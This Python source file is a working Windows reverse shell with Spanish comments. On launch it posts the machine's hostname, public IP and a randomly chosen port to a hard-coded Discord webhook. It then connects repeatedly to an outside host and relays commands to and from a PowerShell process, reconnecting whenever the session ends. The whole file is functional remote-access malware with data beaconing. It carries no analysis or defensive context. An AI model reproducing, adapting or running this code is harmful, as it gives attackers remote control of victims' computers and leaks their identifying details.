import socket, subprocess, threading, requests, json, os, time, random

def socket_to_process(s, p, connection_open):
    while connection_open.is_set():
        try:
            data = s.recv(1024)
            if not data:
                pass
            elif data.split()[0] == b'exit':
                connection_open.clear()
            else:
                p.stdin.write(data)
                p.stdin.flush()
        except socket.timeout:
            connection_open.clear()
            continue

def process_to_socket(s, p, connection_open):
    while connection_open.is_set():
        data = p.stdout.read(1)
        if not data:
            pass
        else:
            s.send(data)

def start():
    global port
    # Genera un puerto aleatorio entre el 4000 y el 5000
    port = random.randint(4000, 5000)
    # Envia un webhook con el nombre del host, la ip y el puerto a discord
    requests.post('https://discord.com/api/webhooks/1213924026070859828/IlB1KbuxRX7Ky29fRBLmrVf9842nIaJS7fkQrbZqSB4zcQhA52fYzZN-IcQCmXQB0VC0', data=json.dumps({'content': f'```\nHost: {os.environ["COMPUTERNAME"]}\nIP: {requests.get("https://api.ipify.org").text}\nPort: {port}```'}), headers={'Content-Type': 'application/json'})

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            s.connect(('xabierland.eus', port))
            s.settimeout(180)
            break
        except:
            time.sleep(5)
            continue

    if s.fileno() != -1:
        connection_open = threading.Event()
        connection_open.set()  # Establecer que la conexión está abierta

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        p = subprocess.Popen(["powershell.exe", "-NoLogo", "-NoProfile"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, startupinfo=startupinfo)

        t1 = threading.Thread(target=socket_to_process, args=(s, p, connection_open))
        t1.start()

        t2 = threading.Thread(target=process_to_socket, args=(s, p, connection_open))
        t2.start()

        t1.join()
        p.terminate()
        t2.join()
        s.close()
        main()

if __name__ == '__main__':
    start()
    main()